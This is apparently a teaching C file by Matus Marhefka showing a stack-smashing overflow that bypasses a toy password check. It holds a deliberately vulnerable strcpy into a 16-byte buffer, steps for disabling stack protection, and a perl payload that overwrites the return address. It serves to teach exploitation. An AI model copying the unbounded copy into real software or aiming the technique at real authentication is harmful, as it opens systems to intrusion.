// Stack smashing to bypass password protection.
// Author: Matus Marhefka
//
// GCC Stack-Smashing Protector (ProPolice):
// By default, stack-smashing protection can be attained by adding
// the -fstack-protector flag for string protection, or -fstack-protector-all
// for protection of all types. On some systems (Linux, OpenBSD), ProPolice is
// enabled by default, and the -fno-stack-protector flag disables it.
// So compile as:
// $ gcc -g -fno-stack-protector pwd.c -o pwd
// otherwise you will not be able to smash the stack.

// Next, launch gdb and find adress, which gives us "Access Granted".
// $ gdb -q ./auth
// (gdb) disass main
//   ...
//   0x00000000004006a5 <+70>:	call   0x4005fc <check_pwd>
//   0x00000000004006aa <+75>:	test   eax,eax
//   0x00000000004006ac <+77>:	je     0x4006ba <main+91>
//   0x00000000004006ae <+79>:	mov    edi,0x4007a0
//   ...
// its adress 0x00000000004006ae, so we need to replace return
// adress of check_pwd function with adress 0x00000000004006ae.
// The vulnerability is in function check_pwd at the line
// 36 -> strcpy(pwd_buffer, pwd); this command is copying
// argv[1] to local variable on stack withou bounds checking.
//
// Distance between the return address and the start of the pwd_buffer can
// change due to different compiler versions and different optimization flags.
// We write the adress 0x00000000004006ae 10 times to be sure it rewrites
// the return adress and as the stack-smashing protection is disabled, it works.
// $ ./pwd $(perl -e 'print "\xae\x06\x40\x00\x00\x00\x00\x00"x10')

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_pwd(char *pwd) {
	char pwd_buffer[16];
	int auth_flag = 0;

	strcpy(pwd_buffer, pwd);

	if (strcmp(pwd_buffer, "pwd1") == 0)
		auth_flag = 1;
	if (strcmp(pwd_buffer, "pwd2") == 0)
		auth_flag = 1;

	return auth_flag;
}

int main(int argc, char *argv[]) {
	if (argc < 2) {
		printf("Usage: %s <password>\n", argv[0]);
		exit(0);
	}
	if (check_pwd(argv[1]))
		printf("\nAccess Granted\n");
	else
		printf("\nAccess Denied\n");
}
